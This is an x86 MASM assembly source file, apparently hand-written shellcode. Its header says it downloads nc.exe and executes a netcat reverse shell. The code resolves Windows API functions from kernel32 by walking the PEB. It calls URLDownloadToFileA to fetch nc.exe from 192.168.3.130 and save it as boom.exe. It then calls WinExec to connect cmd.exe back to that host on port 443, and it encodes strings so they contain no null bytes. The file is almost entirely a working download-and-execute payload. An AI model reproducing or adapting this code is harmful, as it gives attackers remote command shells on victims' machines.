; -----------------------------------------------------------------------------
; Author	: RIZAL MUHAMMED [UB3RSiCK]
; FileName	: urldownload.asm
; Compile/Link	: Compile using MASM
;
;	ml /c /coff urldownload.asm && link /subsystem:windows urldownload.obj
;
; Desc.		: Downloads nc.exe and executes nc reverse shell
; Date		: 21/03/2018
;
; -----------------------------------------------------------------------------
	.model flat, stdcall

	option casemap:none
	assume fs:nothing

	.code

start:
	;; ecx = NtCurrentTeb()->ProcessEnvironmentBlock;
	xor ecx, ecx
	mov ecx, dword ptr fs:[ecx + 30h]

	;; ecx = ecx->Ldr;
	mov ecx, dword ptr [ecx + 0ch]

	;; ecx = ecx->InInitializationOrderModuleList;
	mov ecx, dword ptr [ecx + 1ch]


find_kernel32_dll_base:
	;; ebx = ecx->DllBase;
	mov ebx, dword ptr [ecx + 8h]

	;; eax = ecx->BaseDllName.Buffer;
	mov eax, dword ptr [ecx + 20h]

	;; ecx = ecx->InInitializationOrderLinks;
	mov ecx, dword ptr [ecx]

	;; if (eax[6] == '3')
	cmp byte ptr [eax + 0ch], 33h
	jne find_kernel32_dll_base


	;; nonvolatile ebx = LoadLibrary("kernel32.dll");


	mov ebp, ebx
	;; ebp = ebx->e_lfanew;
	add ebp, dword ptr [ebp + 3ch]
	;; ebp = ebp->OptionalHeader.DataDirectory[0].VirtualAddress;
	mov ebp, dword ptr [ebp + 78h]
	add ebp, ebx


	;; nonvolatile ebp = IMAGE_EXPORT_DIRECTORY;


	;; eax = ebp->AddressOfNames;
	mov eax, dword ptr [ebp + 20h]
	add eax, ebx


	xor edx, edx
find_get_proc_address:
	;; esi = eax[edx]; // eax is ExportNamePointerTable, a dword array
	mov esi, dword ptr [eax + edx * 4]
	add esi, ebx

	inc edx

	;; if (memcmp(esi, 'PteG', 4))
	cmp dword ptr [esi], 'PteG'
	jne find_get_proc_address

	;; if (memcmp(esi + 4, 'Acor', 4))
	cmp dword ptr [esi + 4], 'Acor'
	jne find_get_proc_address


	;; esi = ebp->AddressOfNameOrdinals;
	mov esi, dword ptr [ebp + 24h]
	add esi, ebx

	;; dx = esi[edx]; // esi is ExportOrdinalTable, a _word_ array
	mov dx, word ptr [esi + edx * 2]

	;; esi = ebp->AddressOfFunctions;
	mov esi, dword ptr [ebp + 1ch]
	add esi, ebx

	;; esi = esi[edx]; // esi is is ExportAddressTable, a dword array
	mov esi, dword ptr [esi + edx * 4 - 4]
	add esi, ebx


	;; nonvolatile esi = GetProcAddress;


	xor edi, edi

	;; nonvolatile edi = NULL;
	;; nonvolatile ebx = LoadLibrary("kernel32.dll")	; kernel32.dll module handle
	;; nonvolatile esi = GetProcAddress			; GetProcAddress function address	


	;; eax = GetProcAddress(ebx, "LoadLibraryA");
	push edi
	push 'Ayra'
	push 'rbiL'
	push 'daoL'
	push esp			; pointer to LoadLibraryA string
	push ebx			; kernel32.dll module handle
	call esi			; 

	; HMODULE WINAPI LoadLibrary(
	;	  _In_ LPCTSTR lpFileName
	; );

	;; eax = LoadLibrary("urlmon.dll");
	xor ecx, ecx
	push edi
	mov cx, 'll'
	push ecx
	push 'd.no'
	push 'mlru'
	push esp
	call eax			; eax now has urlmon.dll module handle
		
	; FARPROC WINAPI GetProcAddress(
	;	  _In_ HMODULE hModule,
	;	  _In_ LPCSTR  lpProcName
	; );	

	;; eax = GetProcAddress(eax, "URLDownloadToFileA")
	push edi
	xor ecx, ecx
	mov cx, 'Ae'
	push ecx
	push 'liFo'
	push 'Tdao'
	push 'lnwo'
	push 'DLRU'
	push esp			; pointer to URLDownloadToFileA string
	push eax			; urlmon.dll module handle
	call esi			; eax now has address of URLDownloadToFileA

	; HRESULT URLDownloadToFile(
	;             LPUNKNOWN            pCaller,		; If the calling application is not an ActiveX component, this value can be set to NULL
	;             LPCTSTR              szURL,		; A pointer to a string value that contains the URL to download
	;             LPCTSTR              szFileName,		; filename to save file
	;  _Reserved_ DWORD                dwReserved,		; Reserved. Must be set to 0
	;             LPBINDSTATUSCALLBACK lpfnCB		; This parameter can be set to NULL if status is not required.
	; );

	; Download the file from url http://192.168.3.130/nc.exe and save as boom.exe
	push edi
	push 01657865h			; exe ; to avoid null bytes
	dec byte ptr [esp + 3h]
	push '.cn/'
	push '031.'
	push '3.86'
	push '1.29'
	push '1//:'
	push 'ptth'
	mov ecx, esp			; ecx points to string http://192.168.3.130/nc.exe
	push edi
	push 'exe.'
	push 'moob'
	mov edx, esp			; edx points to string boom.exe, ie the save file name
	push edi			; call back NULL
	push edi			; dwReserved NULL
	push edx			; szFileName
	push ecx			; szURL
	push edi			; pCaller NULL
	call eax			; call URLDownloadToFileA


	; GetProcAddress(WinExec)
	push edi
	push 01636578h			; xec ; to avoid null byte
	dec byte ptr [esp + 3h]
	push 'EniW'
	push esp
	push ebx
	call esi			; eax has WinExec Address
	
	;WinExec('boom.exe 192.168.3.130 443 -e cmd.exe')
	push edi
	push 01010165h
	dec byte ptr [esp + 1h]
	push 'xe.d'
	push 'mc e'
	push '- 34'
	push '4 03'
	push '1.3.'
	push '861.'
	push '291 '
	push 'exe.'
	push 'moob'
	mov ecx, esp
	xor edx, edx
	push edx
	push ecx
	call eax
	
	;; eax = GetProcAddress(ebx, "ExitProcess")
	push edi
	push 01737365h
	dec byte ptr [esp + 3h]
	push 'corP'
	push 'tixE'
	push esp
	push ebx
	call esi

	;; ExitProcess(NULL);
	push edi
	call eax
end start
